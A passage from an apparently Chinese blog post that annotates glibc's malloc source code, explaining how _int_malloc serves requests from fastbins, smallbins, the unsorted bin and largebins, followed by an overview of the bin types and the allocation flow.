victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    (<span class="hljs-type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);<br><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<br>  <span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的变量 <code>mstate</code> 就是 <code>malloc_state</code> 。 <code>__malloc_hook</code> 是一个自定义的 <code>malloc</code> 钩子，可以用来用户自定义修改堆分配函数并且进行测试。如果存在，就执行 <code>hook</code> 函数。</p><p>如果没有用户自定义的钩子函数，就寻找一个 <code>arena</code> 来分配内存，然后调用 <code>_int_malloc</code> 函数去申请对应的内存。如果申请失败，会调用 <code>arena_get_retry</code> 再次申请一个 <code>arena</code> 然后重新分配内存。如果申请到了内存，最后还得解锁，并且判断当前状态：</p><ul><li>要么没有申请到内存</li><li>要么是 mmap 的内存</li><li><strong>要么申请到的内存必须在其所分配的 arena 中</strong></li></ul><p>最后返回内存。</p><h3 id="int-malloc函数"><a href="#int-malloc函数" class="headerlink" title="_ int_ malloc函数"></a>_ int_ malloc函数</h3><p><code>_int_malloc</code> 函数是 <code>__lib_malloc</code> 函数中的核心函数。下面对其代码进行拆解分析：</p><p>首先定义了一堆变量，相关的用处都在注释中给了出来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br>_int_malloc (mstate av, <span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  INTERNAL_SIZE_T nb;               <span class="hljs-comment">/* normalized request size */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx;                 <span class="hljs-comment">/* associated bin index */</span><br>  mbinptr bin;                      <span class="hljs-comment">/* associated bin */</span><br><br>  mchunkptr victim;                 <span class="hljs-comment">/* inspected/selected chunk */</span><br>  INTERNAL_SIZE_T size;             <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-type">int</span> victim_index;                 <span class="hljs-comment">/* its bin index */</span><br><br>  mchunkptr remainder;              <span class="hljs-comment">/* remainder from a split */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;     <span class="hljs-comment">/* its size */</span><br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block;               <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bit;                 <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">map</span>;                 <span class="hljs-comment">/* current word of binmap */</span><br><br>  mchunkptr fwd;                    <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr bck;                    <span class="hljs-comment">/* misc temp for linking */</span><br><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><p>将原本要申请的内存 <code>bytes</code> 进行处理，变成符合要求的内部的 <code>chunk</code> 大小，并且存入 <code>nb</code> 中。然后查询是否有 <code>arena</code> ，没有的话通过系统调用 <code>mmap</code> 一个 <code>chunk</code> 返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">     Convert request size to internal form by adding SIZE_SZ bytes</span><br><span class="hljs-comment">     overhead plus possibly more to obtain necessary alignment and/or</span><br><span class="hljs-comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span><br><span class="hljs-comment">     size. Also, checked_request2size traps (returning 0) request sizes</span><br><span class="hljs-comment">     that are so large that they wrap around zero when padded and</span><br><span class="hljs-comment">     aligned.</span><br><span class="hljs-comment">   */</span><br><br>  checked_request2size (bytes, nb);<br><br>  <span class="hljs-comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span><br><span class="hljs-comment">     mmap.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (av == <span class="hljs-literal">NULL</span>))<br>    &#123;<br>      <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br></code></pre></td></tr></table></figure><p>如果 <code>chunk</code> 的尺寸在 <code>fastbin</code> 中，首先检查是否有对应的 <code>bin</code> 。这里是从 <code>fastbin</code> 的头开始遍历。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">     If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">     This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">     can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment">   */</span><br><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ()))<br>    &#123;<br>    <span class="hljs-comment">// fastbin的下标</span><br>      idx = fastbin_index (nb);<br>      <span class="hljs-comment">// 获得fastbin的头指针</span><br>      mfastbinptr *fb = &amp;fastbin (av, idx);<br>      <span class="hljs-comment">// 令 chunk指针先为头，从头开始遍历</span><br>      mchunkptr pp = *fb;<br>      <span class="hljs-keyword">do</span><br>        &#123;<br>          victim = pp;<br>          <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>      <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))<br>             != victim);<br>      <span class="hljs-comment">// 利用fastbin_index 计算 chunk 的索引。</span><br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<br>            &#123;<br>              errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>            errout:<br>              malloc_printerr (check_action, errstr, chunk2mem (victim), av);<br>              <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<br>          <span class="hljs-comment">// 细致的检查</span><br>          check_remalloced_chunk (av, victim, nb);<br>          <span class="hljs-comment">// 将获取的到chunk转换为mem模式</span><br>          <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>          <span class="hljs-comment">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span><br>          alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>如果获取的内存块处于 <code>small bin</code> 的范围内</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="hljs-comment">   hold one size each, no searching within bins is necessary.</span><br><span class="hljs-comment">   (For a large request, we need to wait until unsorted chunks are</span><br><span class="hljs-comment">   processed to find best fit. But for small ones, fits are exact</span><br><span class="hljs-comment">   anyway, so we can check now, which is faster.)</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>  &#123;<br>   <span class="hljs-comment">// 获得smallbin的下标</span><br>    idx = smallbin_index (nb);<br>    <span class="hljs-comment">// 获取对应 small bin 中的 chunk 指针</span><br>    bin = bin_at (av, idx);<br><span class="hljs-comment">// 获取smallbin的最后一个chunk，如果和bin相等，则说明bin为空。</span><br>    <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>      &#123;<span class="hljs-comment">// 如果不相等，有两种情况</span><br>       <span class="hljs-comment">//第一种，small bin还没有初始化</span><br>        <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check */</span><br>          malloc_consolidate (av);<br>        <span class="hljs-keyword">else</span><br>          &#123;<span class="hljs-comment">//第二种情况，存在空闲的chunk</span><br>            bck = victim-&gt;bk;<br>            <span class="hljs-comment">//检查前一块的fd是否为当前块</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>            &#123;<br>                errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                <span class="hljs-keyword">goto</span> errout;<br>            &#125;<br>            <span class="hljs-comment">// 设标志位 inuse </span><br>            set_inuse_bit_at_offset (victim, nb);<br>            <br>            bin-&gt;bk = bck;<br>            bck-&gt;fd = bin;<br><span class="hljs-comment">// 如果不是 main_arena，设置对应的标志</span><br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>              victim-&gt;size |= NON_MAIN_ARENA;<br>            <span class="hljs-comment">// 检查分配好内存的chunk</span><br>            check_malloced_chunk (av, victim, nb);<br>            <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>            <span class="hljs-comment">// 这里具体查了下，检查是否设置了perturb_byte，如果是，就是将取到的chunk进行非零字符填充 </span><br>            alloc_perturb (p, bytes)<br>            <span class="hljs-keyword">return</span> p;<br>          &#125;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，就会考虑是不是 large bin。但是，其实在 large bin 中并没有直接去扫描对应 bin 中的 chunk，而是先利用 malloc_consolidate（参见 malloc_state 相关函数） 函数处理 fast bin 中的 chunk，将有可能能够合并的 chunk 先进行合并后放到 unsorted bin 中，不能够合并的就直接放到 unsorted bin 中，然后再在下面的大循环中进行相应的处理。为什么不直接从相应的 bin 中取出 large chunk 呢？这是 ptmalloc 的机制，它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><br>  &#123;<span class="hljs-comment">// 获取 largebin的下标</span><br>    idx = largebin_index (nb);<br>    <span class="hljs-keyword">if</span> (have_fastchunks (av))<br>      malloc_consolidate (av);<br>  &#125;<br></code></pre></td></tr></table></figure><p>接下来是一个大的循环，还是分步进行理解：</p><p>在这个循环中，首先考虑从 <code>unsorted bin</code> 进行取 <code>chunk</code> ，然后才会去 <code>large bin</code> 中找，但是对于 small bin chunk 的请求会有所例外。可以看到如果在 <code>smallbin_range</code> 中的话，那么我们首先考虑 last remainder，可以看一下我给的注释部分，这里有一个 <code>last remainder</code> 的概念：malloc使用，那么切割之后剩余的chunk就被称为“last remainder”。如果在bins链中存在freechunk时，当我们去maloc的时候，mal0c的请求大小比freechunk的大小，那么arena就会切制这个freechunk给</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (;; )<br>  &#123;<br>    <span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>      &#123;<br>        bck = victim-&gt;bk;<br>        <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>            || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>          malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                           chunk2mem (victim), av);<br>        size = chunksize (victim);<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">           only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">           runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">           exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">           no exact fit for a small chunk.</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>            bck == unsorted_chunks (av) &amp;&amp;<br>            victim == av-&gt;last_remainder &amp;&amp;<br>            (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>          &#123;<br>            <span class="hljs-comment">/* split and reattach remainder */</span><br>            <span class="hljs-comment">// split之后剩余的尺寸。</span><br>            remainder_size = size - nb;<br>            <span class="hljs-comment">// split之后的位置</span><br>            remainder = chunk_at_offset (victim, nb);<br>            <span class="hljs-comment">// 修改末端的位置</span><br>            unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>            av-&gt;last_remainder = remainder;<br>            remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>            <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>              &#123;<br>                remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>              &#125;<br>            <span class="hljs-comment">// 设置victim的头部，</span><br>            set_head (victim, nb | PREV_INUSE |<br>                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>            <span class="hljs-comment">// 设置remainder的头部</span><br>            set_head (remainder, remainder_size | PREV_INUSE);<br>            set_foot (remainder, remainder_size);<br><br>            check_malloced_chunk (av, victim, nb);<br>            <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>            alloc_perturb (p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>          &#125;<br>        <span class="hljs-comment">/* remove from unsorted list */</span><br>        unsorted_chunks (av)-&gt;bk = bck;<br>        bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><p>现在就要取走的话，当 <code>size</code> 正好和在 <code>unsorted bin</code> 找到的 <code>chunk</code> 块匹配的时候，就直接取走，不走后面的流程（先放入bin中）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><br>         <span class="hljs-keyword">if</span> (size == nb)<br>           &#123;<br>             set_inuse_bit_at_offset (victim, size);<br>             <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>               victim-&gt;size |= NON_MAIN_ARENA;<br>             check_malloced_chunk (av, victim, nb);<br>             <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>             alloc_perturb (p, bytes);<br>             <span class="hljs-keyword">return</span> p;<br>           &#125;<br></code></pre></td></tr></table></figure><p>将取出来的 <code>chunk</code> 放到相应的 <code>bin</code> 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* place chunk in bin */</span><br><br><span class="hljs-keyword">if</span> (in_smallbin_range(size)) &#123;<br>    victim_index = smallbin_index(size);<br>    bck          = bin_at(av, victim_index);<br>    fwd          = bck-&gt;fd;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// large bin 范围</span><br>    victim_index = largebin_index(size);<br>    bck          = bin_at(av, victim_index); <span class="hljs-comment">// 当前 large bin 的头部</span><br>    fwd          = bck-&gt;fd;<br><br>    <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>    <span class="hljs-comment">/* 从这里我们可以总结出，largebin 以 fd_nextsize 递减排序。</span><br><span class="hljs-comment">       同样大小的 chunk，后来的只会插入到之前同样大小的 chunk 后，</span><br><span class="hljs-comment">       而不会修改之前相同大小的fd/bk_nextsize，这也很容易理解，</span><br><span class="hljs-comment">       可以减低开销。此外，bin 头不参与 nextsize 链接。*/</span><br>    <span class="hljs-comment">// 如果 large bin 链表不空</span><br>    <span class="hljs-keyword">if</span> (fwd != bck) &#123;<br>        <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>        <span class="hljs-comment">// 加速比较，应该不仅仅有这个考虑，因为链表里的 chunk 都会设置该位。</span><br>        size |= PREV_INUSE;<br>        <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>        <span class="hljs-comment">// bck-&gt;bk 存储着相应 large bin 中最小的chunk。</span><br>        <span class="hljs-comment">// 如果遍历的 chunk 比当前最小的还要小，那就只需要插入到链表尾部。</span><br>        <span class="hljs-comment">// 判断 bck-&gt;bk 是不是在 main arena。</span><br>        assert(chunk_main_arena(bck-&gt;bk));<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt;<br>            (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask(bck-&gt;bk)) &#123;<br>            <span class="hljs-comment">// 令 fwd 指向 large bin 头</span><br>            fwd = bck;<br>            <span class="hljs-comment">// 令 bck 指向 largin bin 尾部 chunk</span><br>            bck = bck-&gt;bk;<br>            <span class="hljs-comment">// victim 的 fd_nextsize 指向 largin bin 的第一个 chunk</span><br>            victim-&gt;fd_nextsize = fwd-&gt;fd;<br>            <span class="hljs-comment">// victim 的 bk_nextsize 指向原来链表的第一个 chunk 指向的 bk_nextsize</span><br>            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>            <span class="hljs-comment">// 原来链表的第一个 chunk 的 bk_nextsize 指向 victim</span><br>            <span class="hljs-comment">// 原来指向链表第一个 chunk 的 fd_nextsize 指向 victim</span><br>            fwd-&gt;fd-&gt;bk_nextsize =<br>                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 当前要插入的 victim 的大小大于最小的 chunk</span><br>            <span class="hljs-comment">// 判断 fwd 是否在 main arena</span><br>            assert(chunk_main_arena(fwd));<br>            <span class="hljs-comment">// 从链表头部开始找到不比 victim 大的 chunk</span><br>            <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; chunksize_nomask(fwd)) &#123;<br>                fwd = fwd-&gt;fd_nextsize;<br>                assert(chunk_main_arena(fwd));<br>            &#125;<br>            <span class="hljs-comment">// 如果找到了一个和 victim 一样大的 chunk，</span><br>            <span class="hljs-comment">// 那就直接将 chunk 插入到该chunk的后面，并不修改 nextsize 指针。</span><br>            <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size ==<br>                (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask(fwd))<br>                <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                fwd = fwd-&gt;fd;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 如果找到的chunk和当前victim大小不一样</span><br>                <span class="hljs-comment">// 那么就需要构造 nextsize 双向链表了</span><br>                victim-&gt;fd_nextsize              = fwd;<br>                victim-&gt;bk_nextsize              = fwd-&gt;bk_nextsize;<br>                fwd-&gt;bk_nextsize                 = victim;<br>                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>            &#125;<br>            bck = fwd-&gt;bk;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span><br>        <span class="hljs-comment">// 如果空的话，直接简单使得 fd_nextsize 与 bk_nextsize 构成一个双向链表即可。</span><br>        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>&#125;<br></code></pre></td></tr></table></figure><p>最终取出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 放到对应的 bin 中，构成 bck&lt;--&gt;victim&lt;--&gt;fwd。</span><br>mark_bin(av, victim_index);<br>victim-&gt;bk = bck;<br>victim-&gt;fd = fwd;<br>fwd-&gt;bk    = victim;<br>bck-&gt;fd    = victim;<br></code></pre></td></tr></table></figure><p>while最多迭代1w次后退出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">// #define MAX_ITERS 10000</span><br>    <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS) <span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="各类-Bin-的结构和用途"><a href="#各类-Bin-的结构和用途" class="headerlink" title="各类 Bin 的结构和用途"></a><strong>各类 Bin 的结构和用途</strong></h2><ul><li><strong>快速链（Fastbin）</strong>：专用于非常小的块（默认小于 mp_.max_fast，32 位系统约 64B，64 位约 128B）。Fastbin 由 10 个 LIFO 栈（单向链表）组成，每个栈只保存固定大小的块，释放时不会合并邻块 。Fastbin 分配速度极快，通过简单地将 freed 块放入对应链表头来实现。注意，Fastbin 的块直到下一次 malloc 调用会被合并（malloc_consolidate）才进行真正合并处理。</li><li><strong>未分类链（Unsorted Bin）</strong>：一个链表（循环双链表），存放最新释放的块（大小不限） 。当块释放后（且非 Fastbin 范围内），先将其合并前后相邻空闲块，然后入 “未分类” 链表。其作用是“缓冲区”，让 malloc 有机会快速重用最近释放的块 。在 malloc 时，Unsorted Bin 会被扫描：若找到合适大小的块则立即使用，否则将扫描到的块重新放入对应的 Small&#x2F;Large bin 。</li><li><strong>小块链（Small Bin）</strong>：管理固定大小的小空闲块。glibc 默认有 62 个小块链（32 位最多 512B，64 位最多 1024B，每个链保存一个特定大小范围内的块） 。小块链索引公式由 smallbin_index(sz) 定义，每个链中的块大小相等。分配时只做精确匹配：如果请求大小落在小范围内且对应 Small Bin 非空，就直接取出一个块 。这种方式速度快、无搜寻开销。小块链内的空闲块数量和堆碎片化较易控制，因为大小完全一致。</li><li><strong>大块链（Large Bin）</strong>：管理比小块链更大的块。glibc 默认有 63 个大块链 。每个大块链保存大小在一定范围的块（范围不等，且会跨越大跨度，见 glibc 源码中的 largebin_index(sz) 逻辑 ）。大块链保持按块大小降序排列（最大的块在链表头） 。分配时，大于小块阈值的请求会在对应大块链中查找 <em>最适合</em> 的块：首先利用二级索引链（fd_nextsize 指针）找到第一个大于等于请求大小的块，如果有剩余则切分余下部分，否则整个块拿出。如果首选链没有合适块，则按大小位图（binmap）从下一条链开始依次扫描找到可用块 。</li><li><strong>Tcache（线程缓存）</strong>：glibc 2.26 起增加的优化，每线程维护 64 个小块缓存列表。分配时先检查 tcache，有可用块就直接返回，避免锁竞争；释放时优先放入 tcache。tcache 属于“栈”结构，加速常用小对象的重用（此处不深入详述）。在源码逻辑里，tcache 检查发生在进入 _int_malloc 之前 。</li></ul><h2 id="malloc-分配流程概览"><a href="#malloc-分配流程概览" class="headerlink" title="malloc 分配流程概览"></a><strong>malloc 分配流程概览</strong></h2><p>调用 malloc(size) 时，glibc 执行如下主要步骤：</p><ol><li><strong>初始化 Arena</strong>：首次调用时调用 ptmalloc_init()，为主 Arena 初始化 malloc_state 结构，包括设置 top 块指针、各空闲链表头指向自身等 。</li><li><strong>规范化请求大小</strong>：将用户请求加上头部开销并对齐，得到内部块大小 nb &#x3D; request2size(size) 。若 nb 溢出（或为 0），则返回 ENOMEM。</li><li><strong>选择 Arena</strong>：如果是单线程或主 Arena 可用，直接使用 &amp;main_arena；多线程时根据 size 和线程绑定策略选取或创建一个 Arena （涉及 arena_get 等函数）。</li><li><strong>Fastbin 路径</strong>：若 nb &lt;&#x3D; mp_.max_fast（即 nb 在 Fastbin 支持范围内），检查对应的 fastbin 列表 